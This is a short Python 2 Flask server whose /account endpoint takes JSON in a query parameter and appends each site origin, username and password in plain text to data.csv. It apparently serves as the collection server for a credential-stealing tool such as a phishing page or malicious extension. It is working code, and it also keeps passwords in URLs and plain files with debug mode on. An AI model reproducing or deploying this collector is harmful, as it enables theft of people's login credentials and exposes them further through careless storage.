import sys

reload(sys)
sys.setdefaultencoding('UTF-8')

from OpenSSL import SSL
import json
import flask
from flask import request

app = flask.Flask(__name__)

context = SSL.Context(SSL.SSLv23_METHOD)
context.use_privatekey_file('ssl.key')
context.use_certificate_file('ssl.cert')


class Config(object):
    host = '127.0.0.1'
    port = 8001

DATA_PATH = 'data.csv'


@app.route('/account')
def account():
    info = request.args.get('info', None)
    print 'info', info
    if info:
        info = json.loads(info)
        print info
        with open(DATA_PATH, 'a') as f:
            f.write('%s\t%s\t%s\n' % (info['origin'], info['username'], info['password']))

    return 'success'


def main():
    app.run(host=Config.host, port=Config.port, ssl_context=context, debug=True)

if __name__ == '__main__':
    main()
